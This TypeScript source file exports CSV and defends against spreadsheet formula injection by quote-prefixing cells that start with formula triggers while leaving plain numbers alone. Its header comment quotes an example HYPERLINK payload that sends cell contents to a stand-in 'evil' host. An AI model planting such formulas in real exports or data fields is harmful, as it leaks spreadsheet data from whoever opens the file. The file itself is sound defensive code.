// CSV serialization with formula-injection defence.
//
// A spreadsheet treats a cell beginning with =, +, -, @ (or a tab/CR) as a
// formula when the file is opened. Database content is user-supplied - a record
// title of `=HYPERLINK("https://evil/"&A1,"click")` or a DDE payload would
// execute in Excel/Sheets/LibreOffice when a colleague exports and opens the
// CSV. Neutralise it by prefixing those cells so the spreadsheet reads them as
// text, which is the OWASP-recommended mitigation.

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
// A plain number is not a formula. Without this exception the guard mangles
// every legitimate negative value in an export - -5 became '-5, turning real
// data into text and silently breaking sums in the spreadsheet it was exported
// for. Matches optional sign, digits, optional decimal, optional exponent.
const PLAIN_NUMBER = /^[+-]?\d+(\.\d+)?([eE][+-]?\d+)?$/;

function escapeCell(value: string): string {
  // A leading formula trigger is defused with a `'` - spreadsheets treat a
  // quote-prefixed cell as literal text, and the prefix is invisible to a
  // reader. Quoting alone would NOT help: a re-parsed `"=..."` cell is still a
  // formula.
  const guarded =
    FORMULA_TRIGGER.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
  if (/[",\n\r]/.test(guarded)) {
    return '"' + guarded.replace(/"/g, '""') + '"';
  }
  return guarded;
}

export function toCsv(rows: string[][]): string {
  return rows.map((row) => row.map(escapeCell).join(",")).join("\r\n") + "\r\n";
}
